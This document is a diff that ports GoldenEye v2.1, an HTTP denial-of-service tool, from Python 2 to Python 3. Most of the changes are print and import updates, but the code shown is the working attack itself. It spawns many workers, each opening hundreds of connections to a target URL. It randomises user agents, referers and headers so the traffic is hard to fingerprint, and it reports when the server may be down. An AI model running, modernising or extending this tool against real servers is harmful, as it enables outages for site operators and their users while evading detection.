@@ -1,20 +1,19 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 
 """
 $Id: $
 
-     /$$$$$$            /$$       /$$                     /$$$$$$$$                    
-    /$$__  $$          | $$      | $$                    | $$_____/                    
-   | $$  \__/  /$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$ | $$       /$$   /$$  /$$$$$$ 
+     /$$$$$$            /$$       /$$                     /$$$$$$$$
+    /$$__  $$          | $$      | $$                    | $$_____/
+   | $$  \__/  /$$$$$$ | $$  /$$$$$$$  /$$$$$$  /$$$$$$$ | $$       /$$   /$$  /$$$$$$
    | $$ /$$$$ /$$__  $$| $$ /$$__  $$ /$$__  $$| $$__  $$| $$$$$   | $$  | $$ /$$__  $$
    | $$|_  $$| $$  \ $$| $$| $$  | $$| $$$$$$$$| $$  \ $$| $$__/   | $$  | $$| $$$$$$$$
    | $$  \ $$| $$  | $$| $$| $$  | $$| $$_____/| $$  | $$| $$      | $$  | $$| $$_____/
    |  $$$$$$/|  $$$$$$/| $$|  $$$$$$$|  $$$$$$$| $$  | $$| $$$$$$$$|  $$$$$$$|  $$$$$$$
     \______/  \______/ |__/ \_______/ \_______/|__/  |__/|________/ \____  $$ \_______/
-                                                                     /$$  | $$          
-                                                                    |  $$$$$$/          
-                                                                     \______/           
-                                                                                                                                                                                                      
+                                                                     /$$  | $$
+                                                                    |  $$$$$$/
+                                                                     \______/
 
 
 This tool is a dos tool that is meant to put heavy load on HTTP servers
@@ -41,18 +40,10 @@ BY USING THIS SOFTWARE YOU AGREE WITH THESE TERMS.
 """
 
 from multiprocessing import Process, Manager, Pool
-import urlparse, ssl
+import urllib.parse, ssl
 import sys, getopt, random, time, os
-
-# Python version-specific 
-if  sys.version_info < (3,0):
-    # Python 2.x
-    import httplib
-    HTTPCLIENT = httplib
-else:
-    # Python 3.x
-    import http.client
-    HTTPCLIENT = http.client
+import http.client
+HTTPCLIENT = http.client
 
 ####
 # Config
@@ -63,47 +54,47 @@ SSLVERIFY = True
 ####
 # Constants
 ####
-METHOD_GET  = 'get'
+METHOD_GET = 'get'
 METHOD_POST = 'post'
 METHOD_RAND = 'random'
 
-JOIN_TIMEOUT=1.0
+JOIN_TIMEOUT = 1.0
 
-DEFAULT_WORKERS=10
-DEFAULT_SOCKETS=500
+DEFAULT_WORKERS = 10
+DEFAULT_SOCKETS = 500
 
 GOLDENEYE_BANNER = 'GoldenEye v2.1 by Jan Seidl <jseidl@wroot.org>'
 
 USER_AGENT_PARTS = {
     'os': {
         'linux': {
-            'name': [ 'Linux x86_64', 'Linux i386' ],
-            'ext': [ 'X11' ]
+            'name': ['Linux x86_64', 'Linux i386'],
+            'ext': ['X11']
         },
         'windows': {
-            'name': [ 'Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2' ],
-            'ext': [ 'WOW64', 'Win64; x64' ]
+            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
+            'ext': ['WOW64', 'Win64; x64']
         },
         'mac': {
-            'name': [ 'Macintosh' ],
-            'ext': [ 'Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10) ]
+            'name': ['Macintosh'],
+            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10)]
         },
     },
     'platform': {
         'webkit': {
-            'name': [ 'AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30) ],
-            'details': [ 'KHTML, like Gecko' ],
-            'extensions': [ 'Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10) ]
+            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30)],
+            'details': ['KHTML, like Gecko'],
+            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
         },
         'iexplorer': {
             'browser_info': {
-                'name': [ 'MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0' ],
-                'ext_pre': [ 'compatible', 'Windows; U' ],
-                'ext_post': [ 'Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10) ]
+                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
+                'ext_pre': ['compatible', 'Windows; U'],
+                'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
             }
         },
         'gecko': {
-            'name': [ 'Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30) ],
+            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30)],
             'details': [],
             'extensions': []
         }
@@ -147,7 +138,7 @@ class GoldenEye(object):
 
     def exit(self):
         self.stats()
-        print "Shutting down GoldenEye"
+        print("Shutting down GoldenEye")
 
     def __del__(self):
         self.exit()
@@ -155,18 +146,18 @@ class GoldenEye(object):
     def printHeader(self):
 
         # Taunt!
-        print
-        print GOLDENEYE_BANNER
-        print
+        print()
+        print(GOLDENEYE_BANNER)
+        print()
 
     # Do the fun!
     def fire(self):
 
         self.printHeader()
-        print "Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets)
+        print("Hitting webserver in mode '{0}' with {1} workers running {2} connections each. Hit CTRL+C to cancel.".format(self.method, self.nr_workers, self.nr_sockets))
 
         if DEBUG:
-            print "Starting {0} concurrent workers".format(self.nr_workers)
+            print("Starting {0} concurrent workers".format(self.nr_workers))
 
         # Start workers
         for i in range(int(self.nr_workers)):
@@ -179,12 +170,12 @@ class GoldenEye(object):
 
                 self.workersQueue.append(worker)
                 worker.start()
-            except (Exception):
+            except Exception:
                 error("Failed to start worker {0}".format(i))
-                pass 
+                pass
 
         if DEBUG:
-            print "Initiating monitor"
+            print("Initiating monitor")
         self.monitor()
 
     def stats(self):
@@ -192,14 +183,14 @@ class GoldenEye(object):
         try:
             if self.counter[0] > 0 or self.counter[1] > 0:
 
-                print "{0} GoldenEye strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1])
+                print("{0} GoldenEye strikes hit. ({1} Failed)".format(self.counter[0], self.counter[1]))
 
                 if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
-                    print "\tServer may be DOWN!"
-    
+                    print("\tServer may be DOWN!")
+
                 self.last_counter[0] = self.counter[0]
                 self.last_counter[1] = self.counter[1]
-        except (Exception):
+        except Exception:
             pass # silently ignore
 
     def monitor(self):
@@ -214,14 +205,14 @@ class GoldenEye(object):
                 self.stats()
 
             except (KeyboardInterrupt, SystemExit):
-                print "CTRL+C received. Killing all workers"
+                print("CTRL+C received. Killing all workers")
                 for worker in self.workersQueue:
                     try:
                         if DEBUG:
-                            print "Killing worker {0}".format(worker.name)
+                            print("Killing worker {0}".format(worker.name))
                         #worker.terminate()
                         worker.stop()
-                    except Exception, ex:
+                    except Exception:
                         pass # silently ignore
                 if DEBUG:
                     raise
@@ -234,7 +225,7 @@ class GoldenEye(object):
 
 class Striker(Process):
 
-        
+
     # Counters
     request_count = 0
     failed_count = 0
@@ -263,7 +254,7 @@ class Striker(Process):
         self.counter = counter
         self.nr_socks = nr_sockets
 
-        parsedUrl = urlparse.urlparse(url)
+        parsedUrl = urllib.parse.urlparse(url)
 
         if parsedUrl.scheme == 'https':
             self.ssl = True
@@ -277,7 +268,7 @@ class Striker(Process):
             self.port = 80 if not self.ssl else 443
 
 
-        self.referers = [ 
+        self.referers = [
             'http://www.google.com/',
             'http://www.bing.com/',
             'http://www.baidu.com/',
@@ -294,9 +285,9 @@ class Striker(Process):
     def buildblock(self, size):
         out_str = ''
 
-        _LOWERCASE = range(97, 122)
-        _UPPERCASE = range(65, 90)
-        _NUMERIC   = range(48, 57)
+        _LOWERCASE = list(range(97, 122))
+        _UPPERCASE = list(range(65, 90))
+        _NUMERIC   = list(range(48, 57))
 
         validChars = _LOWERCASE + _UPPERCASE + _NUMERIC
 
@@ -310,19 +301,19 @@ class Striker(Process):
     def run(self):
 
         if DEBUG:
-            print "Starting worker {0}".format(self.name)
+            print("Starting worker {0}".format(self.name))
 
         while self.runnable:
 
             try:
 
                 for i in range(self.nr_socks):
-                
-                    if self.ssl:                    
+
+                    if self.ssl:
                         if SSLVERIFY:
                             c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
                         else:
-                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())                                                  
+                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
                     else:
                         c = HTTPCLIENT.HTTPConnection(self.host, self.port)
 
@@ -342,7 +333,7 @@ class Striker(Process):
                     self.incCounter()
 
                 self.closeConnections()
-                
+
             except:
                 self.incFailed()
                 if DEBUG:
@@ -351,24 +342,24 @@ class Striker(Process):
                     pass # silently ignore
 
         if DEBUG:
-            print "Worker {0} completed run. Sleeping...".format(self.name)
-            
+            print("Worker {0} completed run. Sleeping...".format(self.name))
+
     def closeConnections(self):
         for conn in self.socks:
             try:
                 conn.close()
             except:
                 pass # silently ignore
-            
+
 
     def createPayload(self):
 
         req_url, headers = self.generateData()
 
-        random_keys = headers.keys()
+        random_keys = list(headers.keys())
         random.shuffle(random_keys)
         random_headers = {}
-        
+
         for header_name in random_keys:
             random_headers[header_name] = headers[header_name]
 
@@ -386,8 +377,8 @@ class Striker(Process):
             queryString.append(element)
 
         return '&'.join(queryString)
-            
-    
+
+
     def generateData(self):
 
         returnCode = 0
@@ -422,12 +413,12 @@ class Striker(Process):
 
         ## System And Browser Information
         # Choose random OS
-        os = USER_AGENT_PARTS['os'][random.choice(USER_AGENT_PARTS['os'].keys())]
-        os_name = random.choice(os['name']) 
+        os = USER_AGENT_PARTS['os'][random.choice(list(USER_AGENT_PARTS['os'].keys()))]
+        os_name = random.choice(os['name'])
         sysinfo = os_name
 
         # Choose random platform
-        platform = USER_AGENT_PARTS['platform'][random.choice(USER_AGENT_PARTS['platform'].keys())]
+        platform = USER_AGENT_PARTS['platform'][random.choice(list(USER_AGENT_PARTS['platform'].keys()))]
 
         # Get Browser Information if available
         if 'browser_info' in platform and platform['browser_info']:
@@ -482,9 +473,9 @@ class Striker(Process):
             'Keep-Alive': random.randint(1,1000),
             'Host': self.host,
         }
-    
+
         # Randomly-added headers
-        # These headers are optional and are 
+        # These headers are optional and are
         # randomly sent thus making the
         # header count random and unfingerprintable
         if random.randrange(2) == 0:
@@ -498,7 +489,7 @@ class Striker(Process):
             url_part = self.buildblock(random.randint(5,10))
 
             random_referer = random.choice(self.referers) + url_part
-            
+
             if random.randrange(2) == 0:
                 random_referer = random_referer + '?' + self.generateQueryString(random.randint(1, 10))
 
@@ -524,15 +515,15 @@ class Striker(Process):
     def incCounter(self):
         try:
             self.counter[0] += 1
-        except (Exception):
+        except Exception:
             pass
 
     def incFailed(self):
         try:
             self.counter[1] += 1
-        except (Exception):
+        except Exception:
             pass
-        
+
 
 
 ####
@@ -542,26 +533,26 @@ class Striker(Process):
 ####
 
 def usage():
-    print
-    print '-----------------------------------------------------------------------------------------------------------'
-    print
-    print GOLDENEYE_BANNER
-    print 
-    print ' USAGE: ./goldeneye.py <url> [OPTIONS]'
-    print
-    print ' OPTIONS:'
-    print '\t Flag\t\t\tDescription\t\t\t\t\t\tDefault'
-    print '\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: randomly generated)'
-    print '\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS)
-    print '\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS)
-    print '\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)'
-    print '\t -n, --nosslcheck\tDo not verify SSL Certificate\t\t\t\t(default: True)'
-    print '\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)'
-    print '\t -h, --help\t\tShows this help'
-    print
-    print '-----------------------------------------------------------------------------------------------------------'
+    print()
+    print('-----------------------------------------------------------------------------------------------------------')
+    print()
+    print(GOLDENEYE_BANNER)
+    print()
+    print(' USAGE: ./goldeneye.py <url> [OPTIONS]')
+    print()
+    print(' OPTIONS:')
+    print('\t Flag\t\t\tDescription\t\t\t\t\t\tDefault')
+    print('\t -u, --useragents\tFile with user-agents to use\t\t\t\t(default: randomly generated)')
+    print('\t -w, --workers\t\tNumber of concurrent workers\t\t\t\t(default: {0})'.format(DEFAULT_WORKERS))
+    print('\t -s, --sockets\t\tNumber of concurrent sockets\t\t\t\t(default: {0})'.format(DEFAULT_SOCKETS))
+    print('\t -m, --method\t\tHTTP Method to use \'get\' or \'post\'  or \'random\'\t\t(default: get)')
+    print('\t -n, --nosslcheck\tDo not verify SSL Certificate\t\t\t\t(default: True)')
+    print('\t -d, --debug\t\tEnable Debug Mode [more verbose output]\t\t\t(default: False)')
+    print('\t -h, --help\t\tShows this help')
+    print()
+    print('-----------------------------------------------------------------------------------------------------------')
 
-    
+
 def error(msg):
     # print help information and exit:
     sys.stderr.write(str(msg+"\n"))
@@ -573,7 +564,7 @@ def error(msg):
 ####
 
 def main():
-    
+
     try:
 
         if len(sys.argv) < 2:
@@ -630,7 +621,7 @@ def main():
                 with open(uas_file) as f:
                     useragents = f.readlines()
             except EnvironmentError:
-                    error("cannot read file {0}".format(uas_file))
+                error("cannot read file {0}".format(uas_file))
 
         goldeneye = GoldenEye(url)
         goldeneye.useragents = useragents
@@ -640,7 +631,7 @@ def main():
 
         goldeneye.fire()
 
-    except getopt.GetoptError, err:
+    except getopt.GetoptError as err:
 
         # print help information and exit:
         sys.stderr.write(str(err))
